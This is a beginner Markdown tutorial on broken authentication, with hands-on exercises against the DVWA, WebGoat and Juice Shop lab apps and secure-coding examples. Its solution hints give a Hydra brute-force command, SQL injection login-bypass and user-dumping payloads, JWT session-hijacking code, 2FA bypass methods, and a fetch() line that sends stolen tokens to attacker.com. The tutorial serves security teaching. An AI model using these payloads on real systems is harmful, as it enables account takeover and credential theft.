# 🔐 Broken Authentication Tutorial

**Difficulty**: ⭐⭐ (Beginner)  
**Time Required**: 2 hours  
**Applications**: DVWA, WebGoat, Juice Shop

## 📚 Table of Contents
1. [What is Broken Authentication?](#what-is-broken-authentication)
2. [Common Vulnerabilities](#common-vulnerabilities)
3. [How Authentication Breaks](#how-authentication-breaks)
4. [Hands-On Practice](#hands-on-practice)
5. [Defense Strategies](#defense-strategies)
6. [Additional Resources](#additional-resources)

---

## 🎯 Learning Objectives

By the end of this tutorial, you will:
- ✅ Understand common authentication vulnerabilities
- ✅ Exploit weak passwords and session management
- ✅ Perform authentication bypass attacks
- ✅ Implement secure authentication mechanisms
- ✅ Use tools for password cracking and brute forcing

---

## What is Broken Authentication?

Broken Authentication occurs when application functions related to authentication and session management are implemented incorrectly, allowing attackers to compromise passwords, keys, session tokens, or exploit implementation flaws.

### 🎬 Real-World Impact

Major breaches due to broken authentication:
- **Yahoo (2013-2014)**: 3 billion accounts compromised
- **LinkedIn (2012)**: 165 million passwords exposed
- **Ashley Madison (2015)**: Weak password hashing led to exposure
- **Uber (2016)**: Session tokens exposed in GitHub

### 🔍 Common Attack Vectors

- 🔑 Credential stuffing (using breach lists)
- 🔨 Brute force attacks
- 🍪 Session hijacking
- 🔄 Session fixation
- ⏰ Insufficient session timeout

---

## Common Vulnerabilities

### 1. Weak Password Requirements
```
Allows: password123, 12345678, qwerty
```

### 2. Credential Stuffing
Using previously breached username/password pairs

### 3. Predictable Session IDs
```
Session ID: user123_001, user123_002, user123_003
```

### 4. Missing Account Lockout
Unlimited login attempts allowed

### 5. Insecure Password Recovery
Security questions like "What's your pet's name?"

---

## How Authentication Breaks

### Vulnerable Login Code Example

```php
// BAD: SQL Injection + Plain text password
$query = "SELECT * FROM users WHERE username='" . $_POST['username'] . 
         "' AND password='" . $_POST['password'] . "'";

// BAD: Weak session generation
session_id($_POST['username'] . time());

// BAD: No rate limiting
// Allows unlimited login attempts
```

### Secure Login Code Example

```php
// GOOD: Prepared statements + hashed passwords
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$username]);
$user = $stmt->fetch();

if (password_verify($password, $user['password_hash'])) {
    // Generate cryptographically secure session ID
    session_regenerate_id(true);
}
```

---

## Hands-On Practice

### 🏃 Exercise 1: Weak Password Exploitation (DVWA)

**Setup**: Navigate to DVWA Brute Force page  
**Goal**: Gain access using common passwords

:::hint 💡 Hint 1: Start simple
Before using tools, try common passwords manually:
- password
- 123456
- admin
- password123

What usernames might exist? admin? user? test?

:::

:::hint 💡 Hint 2: Observe the response
Try different username/password combinations. Does the error message change between:
- Valid username, wrong password
- Invalid username

This information leak can help!

:::

:::hint 💡 Hint 3: Use a wordlist
Manual attempts not working? Time to automate. Tools like Hydra or Burp Intruder can help. You'll need:
- Target URL
- Username list
- Password list
- Failure indicator

:::

:::hint 🔓 Hint 4
**Manual Method**:
Username: `admin`
Password: `password`

**Automated with Hydra**:
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  http-get-form "localhost:8081/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect:H=Cookie: PHPSESSID=your-session-id"
```

**Using Burp Suite**:
1. Capture login request
2. Send to Intruder
3. Set payload positions on username and password
4. Use cluster bomb attack with wordlists
5. Look for different response length/code

:::

---

### 🏃 Exercise 2: Session Hijacking (Juice Shop)

**Setup**: Use Juice Shop with two different browsers  
**Goal**: Steal and use another user's session

:::hint 💡 Hint 1: Find the session token
After logging in, check:
- Cookies (F12 → Application → Cookies)
- Local Storage
- Session Storage

What stores the authentication state?

:::

:::hint 💡 Hint 2: Copy the session
In Browser 1:
1. Login as any user
2. Copy the session token

In Browser 2:
1. Visit the site
2. Open console
3. Set the same token

How would you set a cookie via JavaScript?

:::

:::hint 💡 Hint 3: Token location matters
Juice Shop uses JWT tokens. They might be in:
- `Authorization` header as `Bearer <token>`
- Cookie named `token`
- Local storage as `token`

:::

:::hint 🔓 Hint 4
**Step 1**: Login and get token (Browser 1)
```javascript
// In console after login
localStorage.getItem('token')
// Copy the JWT token
```

**Step 2**: Hijack session (Browser 2)
```javascript
// Set the stolen token
localStorage.setItem('token', 'stolen-jwt-token-here')
// Refresh the page
location.reload()
```

**Advanced**: Decode the JWT
```javascript
// See what's inside
JSON.parse(atob(token.split('.')[1]))
```

**XSS + Session Theft Combo**:
```javascript
// If you find XSS, steal tokens
fetch('http://attacker.com/steal', {
    method: 'POST',
    body: localStorage.getItem('token')
})
```

:::

---

### 🏃 Exercise 3: Password Reset Flaw (WebGoat)

**Setup**: Navigate to WebGoat Password Reset lesson  
**Goal**: Reset another user's password

:::hint 💡 Hint 1: Understand the flow
Try the password reset process normally:
1. Click "Forgot Password"
2. Enter your username
3. Answer security questions

What information is required? How predictable is it?

:::

:::hint 💡 Hint 2: Security questions weakness
Common security questions are often:
- Publicly available (mother's maiden name)
- Easily guessable (favorite color)
- Social media findable (pet's name)

Can you guess or research the answers?

:::

:::hint 💡 Hint 3: Check for other flaws
Look at:
- The password reset URL/token
- Hidden form fields
- Response differences

Is the reset token predictable? Can you modify the request?

:::

:::hint 🔓 Hint 4
**Method 1: Weak Security Questions**
```
Username: larry
Security Question: What's your favorite color?
Common answers: blue, red, green
```

**Method 2: Parameter Manipulation**
Intercept the reset request and modify:
```
username=victim&securityAnswer=blue
```

**Method 3: Predictable Tokens**
If reset URLs look like:
```
/reset?token=user123_1234567890
```
Try:
```
/reset?token=admin_1234567890
```

**Method 4: Race Condition**
Send multiple reset requests rapidly - some apps generate the same token!

:::

---

### 🏃 Exercise 4: Authentication Bypass (DVWA)

**Setup**: Navigate to DVWA SQL Injection page  
**Goal**: Login without knowing the password

:::hint 💡 Hint 1: SQL Injection basics
Think about the SQL query:
```sql
SELECT * FROM users WHERE user='[input]' AND password='[input]'
```

How can you make this always true?

:::

:::hint 💡 Hint 2: Comment syntax
SQL comments can ignore the rest of the query:
- MySQL: `-- ` or `#`
- MSSQL: `--`
- Oracle: `--`

How would you use this?

:::

:::hint 💡 Hint 3: Always true conditions
What SQL conditions are always true?
- `1=1`
- `'a'='a'`
- `1<2`

Combine with comments for bypass!

:::

:::hint 🔓 Hint 4
**Classic Bypass**:
```
Username: admin' --
Password: anything
```

**Alternative Bypasses**:
```
Username: admin' or '1'='1
Password: anything

Username: ' or 1=1 --
Password: anything

Username: admin'/*
Password: */or'1'='1
```

**Understanding the Attack**:
```sql
-- Original query
SELECT * FROM users WHERE user='admin' AND password='wrong'

-- After injection
SELECT * FROM users WHERE user='admin' -- ' AND password='wrong'

-- Password check is commented out!
```

**Advanced**: Extract all users
```
Username: ' or 1=1 union select null, username, password from users --
```

:::

---

### 🏃 Challenge: Multi-Factor Authentication Bypass

**Goal**: Bypass 2FA implementation flaws

:::hint 🎯 Hint 1
Even with 2FA, implementations can be flawed:
1. Response manipulation
2. Code reuse
3. Race conditions
4. Backup code weaknesses

:::

:::hint 💡 Hint 2
Check for:
- Can you skip the 2FA step by going directly to `/dashboard`?
- Does the server verify the code or just the client?
- Can you use the same code twice?
- Are backup codes predictable?

:::

:::hint 🔓 Hint 3
**Method 1: Direct Access**
```
1. Login with username/password
2. When prompted for 2FA, navigate directly to:
   /dashboard or /home or /account
```

**Method 2: Response Manipulation**
```javascript
// Intercept 2FA verification response
// Change: {"success": false}
// To: {"success": true}
```

**Method 3: Brute Force**
```python
# 6-digit codes = 1 million possibilities
# If no rate limiting:
for code in range(000000, 999999):
    attempt_2fa(code)
```

**Method 4: Code Reuse**
```
1. Obtain valid 2FA code (social engineering)
2. Try using it multiple times
3. Some apps don't invalidate used codes!
```

:::

---

## Defense Strategies

### 🛡️ Strong Authentication Implementation

1. **Password Requirements**
```javascript
function validatePassword(password) {
    const requirements = {
        minLength: 12,
        hasUppercase: /[A-Z]/.test(password),
        hasLowercase: /[a-z]/.test(password),
        hasNumbers: /\d/.test(password),
        hasSpecial: /[!@#$%^&*]/.test(password),
        notCommon: !commonPasswords.includes(password.toLowerCase())
    };
    return Object.values(requirements).every(req => req === true);
}
```

2. **Secure Password Storage**
```python
# Using bcrypt
import bcrypt

# Hashing
password_hash = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt(12))

# Verifying
bcrypt.checkpw(password.encode('utf-8'), password_hash)
```

3. **Account Lockout**
```javascript
const MAX_ATTEMPTS = 5;
const LOCKOUT_DURATION = 15 * 60 * 1000; // 15 minutes

function handleFailedLogin(username) {
    const attempts = getFailedAttempts(username);
    
    if (attempts >= MAX_ATTEMPTS) {
        lockAccount(username, LOCKOUT_DURATION);
        throw new Error('Account locked due to too many failed attempts');
    }
    
    incrementFailedAttempts(username);
}
```

4. **Secure Session Management**
```javascript
// Generate secure session ID
const crypto = require('crypto');
const sessionId = crypto.randomBytes(32).toString('hex');

// Regenerate on privilege change
req.session.regenerate(() => {
    req.session.userId = user.id;
    req.session.save();
});

// Set secure cookie flags
app.use(session({
    cookie: {
        secure: true,      // HTTPS only
        httpOnly: true,    // No JS access
        sameSite: 'strict' // CSRF protection
    }
}));
```

### 🛡️ Additional Security Measures

- **Multi-Factor Authentication (MFA)**
- **Risk-Based Authentication** (location, device, behavior)
- **Passwordless Options** (biometrics, magic links)
- **Account Recovery Security** (multiple verification methods)
- **Monitoring & Alerting** (unusual login patterns)

---

## 📊 Quick Reference

### Common Default Credentials
| Service | Username | Password |
|---------|----------|----------|
| Admin panels | admin | admin, password, 123456 |
| Databases | root | root, toor, password |
| Routers | admin | admin, password, 1234 |
| IoT devices | admin | admin, 12345, password |

### Session Security Checklist
- [ ] Cryptographically random session IDs
- [ ] Session regeneration after login
- [ ] Secure cookie flags (HttpOnly, Secure, SameSite)
- [ ] Reasonable timeout periods
- [ ] Invalidation on logout

---

## 🏆 Skill Check

Before moving on, make sure you can:

- [ ] Identify weak authentication implementations
- [ ] Perform brute force attacks
- [ ] Hijack and manipulate sessions  
- [ ] Bypass authentication using SQL injection
- [ ] Implement secure authentication

---

## Additional Resources

### 🔧 Tools
- **Hydra**: Network login cracker
- **John the Ripper**: Password cracker
- **Hashcat**: Advanced password recovery
- **Burp Suite**: Web security testing

### 📖 Further Reading
- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [NIST Digital Identity Guidelines](https://pages.nist.gov/800-63-3/)
- [Have I Been Pwned](https://haveibeenpwned.com/) - Check breach exposure

### 🎥 Video Resources
- [Computerphile - How NOT to Store Passwords](https://www.youtube.com/watch?v=8ZtInClXe1Q)
- [Tom Scott - The Terrible Security of Bluetooth Locks](https://www.youtube.com/watch?v=RBSGKlAvoiM)

---

**Next Tutorial**: [XML External Entity (XXE)](xxe.md) → 